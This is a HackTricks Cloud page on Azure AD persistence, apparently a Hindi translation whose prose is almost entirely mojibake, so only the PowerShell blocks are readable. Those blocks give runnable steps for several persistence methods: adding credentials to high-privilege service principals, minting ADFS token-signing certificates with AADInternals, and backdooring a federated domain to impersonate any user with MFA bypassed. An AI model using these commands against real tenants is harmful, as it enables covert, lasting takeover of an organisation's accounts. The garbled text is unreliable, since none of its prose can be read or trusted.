# Az - Persistence

<details>

<summary><strong>рдмрдиреЗрдВрдлрд┐рдЯ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ рдФрд░ HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ!</strong></summary>

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ рдпрджрд┐ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХрд▓ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* **ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдХрд╛** **рдЕрдиреБрд╕рд░рдг** рдХрд░реЗрдВред**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ,** [**HackTricks**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github repos рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗред**

</details>

### рдЕрдиреИрддрд┐рдХ рд╕рд╣рдорддрд┐ рдЕрдиреБрджрд╛рди

рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ Azure AD рдореЗрдВ рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдкрдВрдЬреАрдХреГрдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрддреА рд╣реИред рдЗрд╕рд▓рд┐рдП рдЖрдк рдПрдХ рдРрд╕рд╛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдкрдВрдЬреАрдХреГрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдХреЗрд╡рд▓ рд▓рдХреНрд╖рд┐рдд рдХрд┐рд░рд╛рдпреЗрджрд╛рд░ рдХреЗ рд▓рд┐рдП) рдЬрд┐рд╕рдореЗрдВ рдЙрдЪреНрдЪ рдкреНрд░рднрд╛рд╡ рдХреА рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реЛрддреА рд╣реИрдВ рдФрд░ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рд╕рд╣рдорддрд┐ рдХреЗ рд╕рд╛рде рдЗрд╕реЗ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдпрджрд┐ рдЖрдк рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рд╣реИрдВ) - рдЬреИрд╕реЗ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдирд╛рдо рдкрд░ рдореЗрд▓ рднреЗрдЬрдирд╛, рднреВрдорд┐рдХрд╛ рдкреНрд░рдмрдВрдзрди рдЖрджрд┐ред рдпрджрд┐ рд╕рдлрд▓рддрд╛ рдХреЗ рдорд╛рдорд▓реЗ рдореЗрдВ рдпрд╣ рд╣рдореЗрдВ **рдлрд┐рд╢рд┐рдВрдЧ рд╣рдорд▓реЗ рдХреЛ рдХрд╛рдордпрд╛рдмреА рдкреНрд░рд╛рдкреНрдд рд╣реЛрдЧреА**ред

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдЖрдк рдЗрд╕ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдЕрдкрдиреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдЗрд╕ рдкрд░ рдкрд╣реБрдВрдЪ рдмрдиреА рд░рд╣реЗред

### рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдФрд░ рд╕реЗрд╡рд╛ рдкреНрд░рд┐рдВрд╕рд┐рдкрд▓

рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдкреНрд░рд╢рд╛рд╕рдХ, GA рдпрд╛ microsoft.directory/applications/credentials/update рдЕрдиреБрдорддрд┐рдпреЛрдВ рд╡рд╛рд▓реА рдПрдХ рдХрд╕реНрдЯрдо рднреВрдорд┐рдХрд╛ рдХреЗ рд╕рд╛рде, рд╣рдо рдореМрдЬреВрджрд╛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ (рд╕реАрдХреНрд░реЗрдЯ рдпрд╛ рдкреНрд░рдорд╛рдгрдкрддреНрд░) рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВред

рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рд╣рдо **рдЙрдЪреНрдЪ рдЕрдиреБрдорддрд┐рдпреЛрдВ рд╡рд╛рд▓реЗ рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рд▓рдХреНрд╖рд┐рдд рдХрд░реЗрдВ** рдпрд╛ **рдЙрдЪреНрдЪ рдЕрдиреБрдорддрд┐рдпреЛрдВ рд╡рд╛рд▓реЗ рдПрдХ рдирдпрд╛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЬреЛрдбрд╝реЗрдВ**ред

рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рдЬреЛрдбрд╝рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рджрд┐рд▓рдЪрд╕реНрдк рднреВрдорд┐рдХрд╛ рд╣реЛрдЧреА **рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░рд┐рдд рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░рд╢рд╛рд╕рдХ рднреВрдорд┐рдХрд╛** рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕рд╕реЗ **рд╡реИрд╢реНрд╡рд┐рдХ рдкреНрд░рд╢рд╛рд╕рдХреЛрдВ рдХрд╛ рдкрд╛рд╕рд╡рд░реНрдб рд░реАрд╕реЗрдЯ** рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрддреА рд╣реИред

рдпрд╣ рддрдХрдиреАрдХ рднреА **MFA рдХреЛ рджреМрд░рд╛ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐** рджреЗрддреА рд╣реИред

{% code overflow="wrap" %}
```powershell
$passwd = ConvertTo-SecureString "J~Q~QMt_qe4uDzg53MDD_jrj_Q3P.changed" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("311bf843-cc8b-459c-be24-6ed908458623", $passwd)
Connect-AzAccount -ServicePrincipal -Credential $credentials -Tenant e12984235-1035-452e-bd32-ab4d72639a
```
{% endcode %}

* рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЖрдзрд╛рд░рд┐рдд рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд▓рд┐рдП

{% code overflow="wrap" %}
```powershell
Connect-AzAccount -ServicePrincipal -Tenant <TenantId> -CertificateThumbprint <Thumbprint> -ApplicationId <ApplicationId>
```
{% endcode %}

### рд╕рдВрдШ - рдЯреЛрдХрди рд╕рд╛рдЗрди рдХрд░рдиреЗ рд╡рд╛рд▓рд╛ рдкреНрд░рдорд╛рдгрдкрддреНрд░

**DA рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░** рдХреЗ рд╕рд╛рде on-prem AD рдкрд░, рдирдП рдЯреЛрдХрди рд╕рд╛рдЗрди рдХрд░рдиреЗ рдФрд░ рдЯреЛрдХрди рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдмрдирд╛рдирд╛ рдФрд░ рдЖрдпрд╛рдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ рдЬрд┐рдирдХреА рдмрд╣реБрдд рд▓рдВрдмреА рдорд╛рдиреНрдпрддрд╛ рд╣реЛрддреА рд╣реИред рдЗрд╕рд╕реЗ рд╣рдореЗрдВ рдЙрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ **рд▓реЙрдЧ-рдЗрди рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐** рдорд┐рд▓реЗрдЧреА рдЬрд┐рдирдХреЗ ImuutableID рд╣рдореЗрдВ рдкрддрд╛ рд╣реИред

рдиреАрдЪреЗ рджрд┐рдП рдЧрдП рдХрдорд╛рдВрдб рдХреЛ **ADFS рд╕рд░реНрд╡рд░ (рдУрдВ) рдкрд░ DA рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓рд╛рдПрдВ** рдирдП рдкреНрд░рдорд╛рдгрдкрддреНрд░ (рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдкрд╛рд╕рд╡рд░реНрдб 'AADInternals') рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП, рдЙрдиреНрд╣реЗрдВ ADFS рдореЗрдВ рдЬреЛрдбрд╝реЗрдВ, рдСрдЯреЛ рд░реЛрд▓рд╡рд░ рдХреЛ рдЕрдХреНрд╖рдо рдХрд░реЗрдВ рдФрд░ рд╕реЗрд╡рд╛ рдХреЛ рдкреБрдирд░рд╛рд░рдВрдн рдХрд░реЗрдВ:
```powershell
New-AADIntADFSSelfSignedCertificates
```
рддрдм, Azure AD рдХреЗ рд╕рд╛рде рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рдЕрдкрдбреЗрдЯ рдХрд░реЗрдВ:
```powershell
Update-AADIntADFSFederationSettings -Domain cyberranges.io
```
### рд╕рдВрдШ - рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдбреЛрдореЗрди

рдПрдХ рдХрд┐рд░рд╛рдпреЗрджрд╛рд░ рдкрд░ рдЬреАрдП рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде, рдПрдХ рдирдпрд╛ рдбреЛрдореЗрди рдЬреЛрдбрд╝рдирд╛ рд╕рдВрднрд╡ рд╣реИ (рд╕рддреНрдпрд╛рдкрд┐рдд рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП), рдЗрд╕рдХреА рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░рдХрд╛рд░ рдХреЛ рд╕рдВрдШреАрдп рдФрд░ рдбреЛрдореЗрди рдХреЛ рдПрдХ рд╡рд┐рд╢реЗрд╖ рдкреНрд░рдорд╛рдгрдкрддреНрд░ (рдиреАрдЪреЗ рджрд┐рдП рдЧрдП рдХрдорд╛рдВрдб рдореЗрдВ any.sts) рдФрд░ рдЬрд╛рд░рдХ рдХреЛ рд╡рд┐рд╢реНрд╡рд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ:
```powershell
# Using AADInternals
ConvertTo-AADIntBackdoor -DomainName cyberranges.io

# Get ImmutableID of the user that we want to impersonate. Using Msol module
Get-MsolUser | select userPrincipalName,ImmutableID

# Access any cloud app as the user
Open-AADIntOffice365Portal -ImmutableID qIMPTm2Q3kimHgg4KQyveA== -Issuer "http://any.sts/B231A11F" -UseBuiltInCertificate -ByPassMFA$true
```
## рд╕рдВрджрд░реНрдн

* [https://aadinternalsbackdoor.azurewebsites.net/](https://aadinternalsbackdoor.azurewebsites.net/)

<details>

<summary><strong>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ рдФрд░ рд▓рд╛рдн рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ!</strong></summary>

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ рдпрджрд┐ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ HackTricks рдХреЛ рдкреАрдбреАрдПрдл рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХрд╛ рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* **ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ рдореБрдЭреЗ рдЯреНрд╡рд┐рдЯрд░ рдкрд░ рдлрд╝реЙрд▓реЛ рдХрд░реЗрдВ** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗ рдЕрдкрдирд╛ рдпреЛрдЧрджрд╛рди рджреЗрдВред

</details>
